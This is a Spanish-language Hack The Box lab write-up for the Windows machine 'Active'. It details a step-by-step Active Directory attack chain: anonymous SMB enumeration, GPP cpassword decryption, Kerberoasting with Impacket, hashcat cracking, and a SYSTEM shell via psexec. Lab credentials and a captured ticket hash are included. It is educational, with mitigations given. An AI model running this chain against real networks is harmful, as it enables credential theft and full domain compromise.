# 🟢 Active — WriteUp HTB

> **Plataforma:** Hack The Box  
> **Dificultad:** Fácil  
> **SO:** Windows  
> **Fecha de lanzamiento:** 28 Jul 2018  
> **Fecha de retiro:** 04 May 2024  
> **Creadores:** eks, mrb3n

---

## 📑 Índice

1. [Introducción](#introducción)
2. [Reconocimiento](#reconocimiento)
3. [Enumeración SMB](#enumeración-smb)
4. [Recurso Compartido Replication](#recurso-compartido-replication)
5. [Contraseñas GPP](#contraseñas-gpp)
6. [Recurso Compartido Users — Flag de Usuario](#recurso-compartido-users--flag-de-usuario)
7. [Kerberoasting](#kerberoasting)
8. [Acceso como Administrador](#acceso-como-administrador)
9. [Shell en el Sistema](#shell-en-el-sistema)

---

## 🧠 Introducción

Active es un ejemplo perfecto de máquina de dificultad fácil que, a pesar de ello, ofrece una cantidad enorme de aprendizaje práctico. Toda la máquina gira en torno a vulnerabilidades comunes de **Active Directory (AD)**, el servicio de directorio de Microsoft presente en la inmensa mayoría de entornos corporativos Windows.

A lo largo de este writeup trabajaremos con dos técnicas fundamentales en pentesting de entornos AD:

- **Enumeración SMB:** El protocolo SMB (*Server Message Block*) se usa en Windows para compartir archivos, impresoras y recursos de red. Aprenderemos a listar y acceder a recursos compartidos sin credenciales.
- **Kerberoasting:** Un ataque específico contra el protocolo de autenticación Kerberos que nos permite obtener hashes de contraseñas de cuentas de servicio y crackearlos offline.

---

## 🔎 Reconocimiento

### 🌐 nmap — Descubrimiento de puertos

El primer paso en cualquier pentest es el reconocimiento. Usaremos **nmap**, el escáner de redes más popular, para descubrir qué puertos tiene abiertos la máquina y qué servicios están corriendo.

Lanzamos primero un escaneo de **todos los puertos TCP** con alta velocidad:

```bash
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.129.31.98
```

**Explicación de los flags:**
- `-sT` → Escaneo TCP connect (más fiable que SYN en algunos entornos)
- `-p-` → Escanear los 65535 puertos
- `--min-rate 5000` → Enviar al menos 5000 paquetes por segundo (más rápido)
- `-oA nmap/alltcp` → Guardar resultados en todos los formatos en la carpeta `nmap/`

```
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 21:35 EDT
Nmap scan report for 10.10.10.100                           
Host is up (0.020s latency).                                                                                              
Not shown: 65512 closed ports 
PORT      STATE SERVICE   
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap             
636/tcp   open  ldapssl                                        
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl                    
5722/tcp  open  msdfsr                              
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown                             
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49170/tcp open  unknown
49179/tcp open  unknown
                                                                                            
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
```

![](/Images/active1.png)<br>

> 💡 **¿Cómo sabemos que es un Controlador de Dominio (DC)?**  
> La combinación de puertos que vemos es la firma inequívoca de un DC de Active Directory:
> - Puerto **88** → Kerberos (autenticación del dominio)
> - Puerto **389 y 3268** → LDAP y Global Catalog (directorio de AD)
> - Puerto **53** → DNS (los DCs siempre actúan como servidores DNS)
> - Puerto **5722** → Replicación DFSR entre DCs
> - Puerto **9389** → AD Web Services
>
> El puerto **3268** (Global Catalog LDAP) es especialmente revelador — prácticamente solo aparece en Controladores de Dominio.

Ahora lanzamos un segundo escaneo sobre esos puertos para obtener **versiones de servicios y scripts de detección**:

```bash
nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152-49158,49169,49170,49179 --min-rate 5000 -oA nmap/scripts 10.129.31.98
```

**Explicación de los flags adicionales:**
- `-sV` → Detectar versiones de los servicios
- `-sC` → Ejecutar scripts de detección por defecto de nmap

```
PORT      STATE  SERVICE       VERSION                                                        
53/tcp    open   domain        Microsoft DNS 6.1.7600 (1DB04001) (Windows Server 2008 R2)
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2018-07-29 01:37:17Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5722/tcp  open   msrpc         Microsoft Windows RPC
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPinP)
49152/tcp open   msrpc         Microsoft Windows RPC
[...resto de puertos RPC...]

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a2:16:8b (VMware)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
```

![](/Images/active2.png)<br>

De este escaneo extraemos información muy valiosa:
- **Sistema operativo:** Windows Server 2008 R2
- **Nombre del dominio:** `active.htb`
- **Nombre del host:** `DC`
- **SMB signing** activado (importante para ataques de relay, aunque no aplica aquí)

Finalmente, escaneamos también puertos **UDP**:

```bash
nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.129.31.98
```

```
PORT      STATE SERVICE
123/udp   open  ntp
137/udp   open  netbios-ns
49413/udp open  unknown
49616/udp open  unknown
65096/udp open  unknown
```

![](/Images/active3.png)<br>

El puerto UDP 123 (NTP) es habitual en DCs ya que sincronizan el tiempo del dominio. Nada especialmente relevante aquí.

---

## 📂 Enumeración SMB

### 🔎 ¿Qué es SMB?

**SMB (Server Message Block)** es el protocolo de red que Windows usa para compartir archivos, impresoras y recursos. Opera sobre los puertos **139 y 445**. En entornos de AD, los DCs exponen siempre una serie de recursos compartidos por defecto como `SYSVOL` y `NETLOGON`.

Una de las primeras cosas que hacemos al encontrar SMB es intentar acceder **sin credenciales** (acceso anónimo o de invitado), ya que las configuraciones incorrectas son muy comunes.

### 📋 Listado de recursos compartidos

Usamos `enum4linux`, una herramienta clásica para enumerar información de sistemas Windows vía SMB:

```bash
enum4linux -a 10.129.31.98
```

**Flag `-a`** → Realiza todas las comprobaciones disponibles.

```
 =========================================
|    Share Enumeration on 10.10.10.100    |
 =========================================

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk

[+] Attempting to map shares on 10.10.10.100
//10.10.10.100/ADMIN$       Mapping: DENIED, Listing: N/A
//10.10.10.100/C$           Mapping: DENIED, Listing: N/A
//10.10.10.100/IPC$         Mapping: OK     Listing: DENIED
//10.10.10.100/NETLOGON     Mapping: DENIED, Listing: N/A
//10.10.10.100/Replication  Mapping: OK, Listing: OK
//10.10.10.100/SYSVOL       Mapping: DENIED, Listing: N/A
//10.10.10.100/Users        Mapping: DENIED, Listing: N/A
```

> ⚠️ `enum4linux` vuelca mucha información mezclada con errores, lo que puede resultar confuso. Una alternativa más limpia es `smbmap`:

```bash
smbmap -H 10.129.31.98
```

```
[+] IP: 10.10.10.100:445    Name: 10.10.10.100                                      
        Disk                    Permissions
        ----                    -----------
        ADMIN$                  NO ACCESS
        C$                      NO ACCESS
        IPC$                    NO ACCESS
        NETLOGON                NO ACCESS
        Replication             READ ONLY      ← ¡Acceso anónimo!
        SYSVOL                  NO ACCESS
        Users                   NO ACCESS
```

![](/Images/active4.png)<br>

`smbmap` nos muestra de forma clara y directa los permisos sobre cada recurso. Sin necesidad de credenciales, tenemos **acceso de lectura al recurso `Replication`**. Esto es una mala configuración que aprovecharemos.

> 💡 **Recursos compartidos por defecto en un DC:**
> - `ADMIN$` → Directorio de Windows (C:\Windows), solo admins
> - `C$` → Raíz del disco C:, solo admins  
> - `IPC$` → Canal de comunicación entre procesos, usado para enumerar
> - `NETLOGON` → Scripts de inicio de sesión
> - `SYSVOL` → Políticas de grupo y scripts del dominio
> - `Replication` → En este caso, una copia del SYSVOL (configuración incorrecta)

---

## 📁 Recurso Compartido Replication

### 🔐 Conexión y exploración

Nos conectamos al recurso `Replication` usando `smbclient`, el cliente SMB de Linux:

```bash
smbclient //10.129.31.98/Replication -U ""%""
```

**Explicación:** `""%""` le indica a smbclient que use usuario vacío y contraseña vacía (acceso anónimo).

```
Try "help" to get a list of possible commands.                            
smb: \> recurse ON
smb: \> ls
```

![](/Images/active5.png)<br>

Activamos el modo recursivo para listar todos los archivos del recurso. Al explorar la estructura de directorios encontramos algo muy interesante:

```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
```

![](/Images/active6.png)<br>

Un archivo llamado **`Groups.xml`** dentro de una Política de Grupo. Esto es una señal de alarma inmediata para cualquier pentester.

Lo descargamos y examinamos su contenido:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
        name="active.htb\SVC_TGS"
        image="2"
        changed="2018-07-18 20:46:06"
        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U"
                newName=""
                fullName=""
                description=""
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                changeLogon="0"
                noChange="1"
                neverExpires="1"
                acctDisabled="0"
                userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```
![](/Images/active7.png)<br>

Tenemos dos campos cruciales:
- **`userName`:** `active.htb\SVC_TGS` — un usuario del dominio
- **`cpassword`:** una contraseña cifrada con AES

![](/Images/active8.png)
---

## 🔑 Contraseñas GPP

### 🔎 ¿Qué son las GPP y por qué son vulnerables?

Las **GPP (Group Policy Preferences)** son una característica de Active Directory que permite a los administradores configurar sistemas del dominio de forma centralizada: crear usuarios locales, mapear unidades de red, cambiar contraseñas, etc.

Cuando un administrador configura una GPP que incluye una contraseña (por ejemplo, para crear un usuario local en todas las máquinas), Windows guarda esa configuración en un archivo XML dentro del **SYSVOL** — un recurso compartido accesible por **todos los usuarios autenticados del dominio** (e incluso a veces sin autenticación, como en este caso).

Para "proteger" la contraseña, Microsoft la cifra con **AES-256**. El problema es que **Microsoft publicó públicamente la clave de cifrado en su propia documentación (MSDN)**. Esto significa que cualquiera que encuentre un `cpassword` puede descifrarlo trivialmente.

> 🔑 **La clave AES publicada por Microsoft es:**  
> `4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8`  
> `f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b`

Microsoft publicó un parche en **2014 (MS14-025)** que impide a los administradores crear nuevas GPP con contraseñas. Sin embargo, este parche **no elimina las contraseñas ya existentes**, y los pentesters siguen encontrándolas regularmente en entornos reales.

### 🔓 Descifrado con gpp-decrypt

Kali Linux incluye la herramienta `gpp-decrypt` que automatiza el proceso:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```
GPPstillStandingStrong2k18
```

![](/Images/active9.png)<br>

Tenemos las credenciales del usuario `SVC_TGS`:
- **Usuario:** `active.htb\SVC_TGS`
- **Contraseña:** `GPPstillStandingStrong2k18`

---

## 👤 Recurso Compartido Users — Flag de Usuario

### 🔑 Acceso autenticado

Con las credenciales obtenidas, comprobamos a qué recursos tenemos acceso ahora:

```bash
smbmap -H 10.129.31.98 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

```
        Disk            Permissions
        ----            -----------
        ADMIN$          NO ACCESS
        C$              NO ACCESS
        IPC$            NO ACCESS
        NETLOGON        READ ONLY
        Replication     READ ONLY
        SYSVOL          READ ONLY
        Users           READ ONLY      ← ¡Nuevo acceso!
```

![](/Images/active10.png)<br>

Hemos ganado acceso a tres recursos adicionales: `NETLOGON`, `SYSVOL` y `Users`. El más interesante es `Users`, que corresponde al directorio `C:\Users\` del sistema.

Nos conectamos:

```bash
smbclient //10.129.31.98/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```

```
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                         DHS        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                      DHS        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
```

![](/Images/active11.png)<br>

Vemos los directorios de perfil de los usuarios. Navegamos al escritorio del usuario `SVC_TGS` y obtenemos la flag:

```bash
smb: \SVC_TGS\desktop\> get user.txt
```

```
root@kali# cat user.txt
86d67d8b...
```

![](/Images/active12.png)<br>

![](/Images/active13.png)<br>

✅ **¡Flag de usuario conseguida!**

---

## 🔥 Kerberoasting

### 🧠 Contexto: ¿Cómo funciona Kerberos?

**Kerberos** es el protocolo de autenticación estándar en entornos Windows Active Directory. Funciona mediante un sistema de *tickets* criptográficos que evita que las contraseñas viajen por la red.

El flujo básico de autenticación es:

1. El usuario contacta al **DC (KDC - Key Distribution Center)** y solicita acceso a un servicio.
2. El DC busca el **SPN (Service Principal Name)** del servicio — un identificador único que asocia un servicio con una cuenta de usuario.
3. El DC genera un **TGS (Ticket Granting Service)** cifrado con el **hash NTLM de la contraseña de la cuenta de servicio**.
4. El usuario envía ese ticket al servicio, que lo descifra con su propia contraseña y verifica la identidad.

### 🎯 ¿En qué consiste el ataque Kerberoasting?

En lugar de enviar el ticket al servicio legítimo, **nos quedamos con el ticket cifrado** y lo atacamos offline mediante fuerza bruta. Si la contraseña de la cuenta de servicio es débil, podremos descifrarla.

Este ataque fue presentado por **Tim Medin** en 2014 y sigue siendo extremadamente relevante hoy en día porque:
- Solo necesitamos credenciales de un usuario normal del dominio (no admin)
- El ataque no genera alertas especialmente llamativas (es tráfico Kerberos legítimo)
- Muchas cuentas de servicio tienen contraseñas débiles o que nunca expiran

> 💡 **¿Qué es un SPN?**  
> Un SPN (Service Principal Name) es un identificador único de un servicio dentro de un dominio. Por ejemplo: `active/CIFS:445` identifica el servicio CIFS del host `active` en el puerto 445. Solo las cuentas con SPNs asociados son vulnerables a Kerberoasting.

### 🧾 Obtención del hash

Usamos el script `impacket-GetUserSPNs` de la suite **Impacket** para:
1. Listar todas las cuentas con SPNs (susceptibles de Kerberoasting)
2. Solicitar y capturar el ticket TGS cifrado

```bash
impacket-GetUserSPNs -request -dc-ip 10.129.31.98 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

**Explicación de los flags:**
- `-request` → Solicitar el ticket TGS además de listar los SPNs
- `-dc-ip` → IP del Controlador de Dominio
- `-save -outputfile` → Guardar el hash en un archivo para crackearlo después

```
Password: GPPstillStandingStrong2k18

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40  2018-07-21 11:05:53
```

![](/Images/active14.png)<br>

El script identificó que la cuenta **Administrator** tiene un SPN asociado (`active/CIFS:445`). Esto es inusual y muy valioso — normalmente los SPNs se asignan a cuentas de servicio dedicadas, no al administrador.

El archivo `GetUserSPNs.out` contiene el hash TGS:

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174
```

![](/Images/active15.png)<br>

### 💥 Crackeo del hash con Hashcat

Usamos **Hashcat**, la herramienta de crackeo de hashes por GPU más popular, para atacar el hash offline:

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

**Explicación de los flags:**
- `-m 13100` → Tipo de hash: Kerberos 5 TGS-REP etype 23 (el formato `$krb5tgs$23$...`)
- `-a 0` → Modo de ataque: diccionario (comparar el hash contra cada palabra de una lista)
- `rockyou.txt` → El diccionario más usado en CTFs, contiene ~14 millones de contraseñas reales filtradas
- `--force` → Ignorar advertencias (necesario en algunas configuraciones de VM)

> 💡 **¿Cómo funciona el crackeo de hashes?**  
> Hashcat toma cada palabra del diccionario, la hashea usando el mismo algoritmo (en este caso RC4/NTLM para Kerberos) y compara el resultado con nuestro hash capturado. Si coinciden, la palabra era la contraseña original. Este proceso ocurre completamente en local, sin contactar el DC.

```
[...snip...]
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$[...hash completo...]:Ticketmaster1968
```

![](/Images/active16.png)<br>

✅ **Hash crackeado.** Las credenciales del Administrador son:
- **Usuario:** `Administrator`
- **Contraseña:** `Ticketmaster1968`

---

## 👑 Acceso como Administrador

### 📊 Enumeración de recursos con credenciales de admin

Con las credenciales de administrador del dominio, verificamos nuestro nivel de acceso:

```bash
smbmap -H 10.129.31.98 -d active.htb -u administrator -p Ticketmaster1968
```

```
        Disk            Permissions
        ----            -----------
        ADMIN$          READ, WRITE    ← Acceso total
        C$              READ, WRITE    ← Todo el disco C:
        IPC$            NO ACCESS
        NETLOGON        READ, WRITE
        Replication     READ ONLY
        SYSVOL          READ, WRITE
        Users           READ ONLY
```

![](/Images/active17.png)<br>

Ahora tenemos acceso de lectura y escritura al disco completo del servidor (`C$`).

### 🏁 Obtención de la flag de root

Nos conectamos directamente al recurso `C$` y obtenemos la flag de root:

```bash
smbclient //10.129.31.98/C$ -U active.htb\\administrator%Ticketmaster1968
```

```
smb: \> get \users\administrator\desktop\root.txt
getting file \users\administrator\desktop\root.txt of size 34 as root.txt (0.4 KiloBytes/sec)
```

```bash
cat root.txt
b5fc76d1...
```

![](/Images/active18.png)<br>

![](/Images/active19.png)<br>

✅ **¡Flag de root conseguida!**

> 🎯 **Punto importante:** Acabamos de obtener la flag de root **sin conseguir ninguna shell** en el sistema. Hemos comprometido completamente la máquina a través del protocolo SMB únicamente. Esto demuestra que en entornos Windows, el control del sistema no siempre requiere ejecución de código remoto.

---

## 💻 Shell en el Sistema

Por completitud y para practicar, también vamos a obtener una shell interactiva. Ahora que tenemos credenciales de administrador y acceso de escritura a `ADMIN$`, podemos usar **PsExec**.

### ⚙️ ¿Cómo funciona PsExec de Impacket?

`psexec.py` (o `impacket-psexec`) funciona así:
1. Sube un ejecutable binario a la carpeta `ADMIN$` (C:\Windows) a través de SMB
2. Crea un servicio de Windows temporal que ejecuta ese binario
3. Redirige la entrada/salida estándar a nuestra conexión, creando una shell interactiva
4. Al salir, elimina el servicio y el archivo

```bash
impacket-psexec active.htb/administrator@10.129.31.98
```

```
Password: Ticketmaster1968

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file dMCaaHzA.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service aYMa on 10.10.10.100.....
[*] Starting service aYMa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

![](/Images/active20.png)<br><br>

✅ **Shell obtenida como `NT AUTHORITY\SYSTEM`** — el nivel de privilegio más alto en Windows, equivalente a root en Linux.

---

## 📌 Resumen de la cadena de ataque

```
Acceso anónimo SMB (Replication)
            ↓
    Lectura de Groups.xml
            ↓
    Descifrado de cpassword GPP
            ↓
    Credenciales: SVC_TGS / GPPstillStandingStrong2k18
            ↓
    Kerberoasting → TGS del Administrador
            ↓
    Crackeo con Hashcat
            ↓
    Credenciales: Administrator / Ticketmaster1968
            ↓
    Acceso total al sistema (SMB + Shell)
```

## 📚 Lecciones aprendidas

| Vulnerabilidad | Impacto | Mitigación |
|---|---|---|
| Acceso anónimo a recurso SMB | Exposición de archivos internos | Revisar permisos de todos los recursos compartidos |
| Contraseña GPP en SYSVOL | Compromiso de cuenta de dominio | Aplicar MS14-025 y buscar/eliminar cpasswords existentes |
| SPN asignado a cuenta Administrador | Kerberoasting directo a admin | No asignar SPNs a cuentas privilegiadas; usar cuentas de servicio dedicadas con contraseñas largas y aleatorias |
| Contraseña débil en cuenta de servicio | Hash crackeado trivialmente | Usar contraseñas de +25 caracteres aleatorios en cuentas de servicio; considerar Group Managed Service Accounts (gMSA) |

---

*WriteUp realizado con fines educativos en el contexto de Hack The Box.*
